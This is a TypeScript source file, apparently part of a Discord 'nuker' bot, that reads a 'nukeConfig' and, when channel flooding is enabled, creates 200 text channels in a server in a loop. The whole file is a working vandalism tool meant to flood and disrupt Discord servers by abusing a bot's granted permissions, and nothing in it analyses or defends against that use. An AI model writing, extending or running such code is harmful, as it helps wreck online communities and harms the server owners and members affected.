import { Guild, ChannelType } from "discord.js";
import { nukeConfig } from "../index";

export default async (guild: Guild): Promise<void> => {
	if (nukeConfig.CHANNELS_FLOOD) {
		try {
			for (let i = 0; i < 200; i++) {
				const channel = await guild.channels.create({
					name: nukeConfig.CHANNELS_FLOOD_NAME,
					type: ChannelType.GuildText,
				});
			}
		} catch (error) {
			console.log(error);
		}
	}
};
